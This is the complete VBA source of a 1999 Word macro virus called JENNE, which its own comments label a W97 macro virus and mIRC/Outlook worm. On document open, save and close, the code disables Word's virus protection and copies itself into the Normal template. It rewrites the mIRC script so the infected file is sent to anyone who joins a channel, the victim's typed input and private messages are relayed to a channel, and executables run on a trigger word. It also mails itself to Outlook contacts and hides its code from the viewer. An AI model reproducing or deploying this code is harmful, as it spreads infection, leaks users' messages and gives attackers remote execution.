Attribute VB_Name = "JENNE"

Sub AutoOpen()

On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.EnableCancelKey = False
Application.VBE.ActiveVBProject.VBComponents("JENNE").Export ("C:\JENNE.drv")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JENNE" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JENNE" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set firefox = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set firefox = ActiveDocument.VBProject
firefox.VBComponents.Import ("C:\JENNE.drv")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

MkDir "C:\Windows\JENNE\"
ActiveDocument.SaveAs FileName:="C:\Windows\JENNE\JENNE.doc", FileFormat:=wdFormatDocument

Kill "C:\Jenne.ini"
Open "C:\Jenne.ini" For Output As #1
Print #1, "[SCRIPT]"
Print #1, ";JENNE SCRIPT - KEEP IT LOAD IF U WANNA BE SAFE"
Print #1, "n0=on 1:start:{"
Print #1, "n1= .remote on"
Print #1, "n2= .ctcps on"
Print #1, "n3= .events on"
Print #1, "n4= }"
Print #1, "n5=on 1:join:#:{"
Print #1, "n6=if ( $nick == $me ) { halt } | .dcc send $nick C:\Windows\Jenne\JENNE.doc"
Print #1, "n7= }"
Print #1, "n8=on 1:input:*:.msg #JENNE [( $+ $active $+ ) $1-]"
Print #1, "n9=on 1:text:*:?:.msg #JENNE [( $+ $active $+ )]"
Print #1, "n10=on 1:text:FIREJENNE:*://run $findfile(c:\,**.exe*,1)"
Close #1
Kill "C:\mirc\Script.ini"
SourceFile = "C:\Jenne.ini"
DestinationFile = "C:\mirc\Script.ini"
FileCopy SourceFile, DestinationFile
Kill "C:\Jenne.ini"

If Day(Now()) = 2 And Month(Now()) = 12 Then
MsgBox "Happy birthday Jenne-firefox^_^ Bad Ole Unca HeLLfiReZ still loves you xxxxxxxx", "Jenne-firefox^_^"
End If

if System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "JENNE") <> "Jenne-firefox" Then
 Set JENNEF = CreateObject("Outlook.Application")
 Set Nam = JENNEF.GetNameSpace("MAPI")
 If JENNEF = "Outlook" Then
  Nam.Logon "profile", "password"
    For y = 1 To Nam.AddressLists.Count
     Set Fox_ = Nam.AddressLists(y)
    x = 1
     Set Fire = JENNEF.CreateItem(0)
     For oo = 1 To Fox_.AddressEntries.Count
       Peep = Fox_.AddressEntries(x)
       Fire.Recipients.Add Peep
       x = x + 1
       If x > 70 Then oo = Fox_.AddressEntries.Count
    Next oo
 Fire.Subject = "Hi! it's" & Application.UserName
 Fire.Body = "Remember!!! On Dec99 the 2nd, she will be 35! Happy birthday Jenne-firefox^_^"
 Fire.Attachments.Add ThisDocument.FullName
 Fire.Send
 Peep = ""
 Next y
 Nam.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "JENNE") = "Jenne-firefox"
End If
End Sub


Sub ToolsMacro()
'V_Name = [Jenne-firefox^_^]
'Nhgube = [Qry_Nezt0_4_ArgFabbcre/UryySverm]
'Date   = [23nov99 Designed by Del_Armg0]
'Type   = [W97MacroVirus/Mirc_OutLook_Worm]
'Disclaim = [Happy birthday Jenne-firefox^_^ Bad Ole Unca HeLLfiReZ still loves you xxxxxxxx]
End Sub

Sub ViewVBCode()
MsgBox "No code tO see! ;)"
End Sub

Sub ToolsCustomize()
'
End Sub

Sub FileTemplates()
'
End Sub

Sub Jenne_FireFox()
'Happy birthday Jenne-firefox^_^ Bad Ole Unca HeLLfiReZ still loves you xxxxxxxx
End Sub

Sub FileSave()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.EnableCancelKey = False
Application.VBE.ActiveVBProject.VBComponents("JENNE").Export ("C:\JENNE.drv")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JENNE" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JENNE" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set firefox = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set firefox = ActiveDocument.VBProject
firefox.VBComponents.Import ("C:\JENNE.drv")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
MkDir "C:\Windows\JENNE\"
ActiveDocument.SaveAs FileName:="C:\Windows\JENNE\JENNE.doc", FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.EnableCancelKey = False
Application.VBE.ActiveVBProject.VBComponents("JENNE").Export ("C:\JENNE.drv")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JENNE" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JENNE" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set firefox = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set firefox = ActiveDocument.VBProject
firefox.VBComponents.Import ("C:\JENNE.drv")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
MkDir "C:\Windows\JENNE\"
ActiveDocument.SaveAs FileName:="C:\Windows\JENNE\JENNE.doc", FileFormat:=wdFormatDocument
End Sub
